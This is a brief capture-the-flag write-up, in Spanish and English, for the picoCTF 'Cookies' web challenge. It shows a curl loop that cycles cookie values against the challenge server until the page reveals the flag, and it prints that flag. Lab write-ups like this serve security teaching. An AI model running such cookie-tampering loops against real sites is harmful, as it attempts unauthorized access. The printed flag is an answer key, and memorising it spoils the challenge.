###  Cookies

### DESCRIPCIÓN

Who doesn't love cookies? Try to figure out the best one.http://wily-courier.picoctf.net:50869/
### SOLUCIÓN

Usando la consola:

```
curl http://wily-courier.picoctf.net:50869/check -H "Cookie: name=1"

for i in {1..30}; do curl -s http://wily-courier.picoctf.net:50869/check -H "Cookie: name=$i"; done | grep pico

```

```
UZIEL_M-picoctf@webshell:~$ for i in {1..30}; do curl -s http://wily-courier.picoctf.net:50869/check -H "Cookie: name=$i"; done | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
```
### NOTAS ADICIONALES


### REFERENCIAS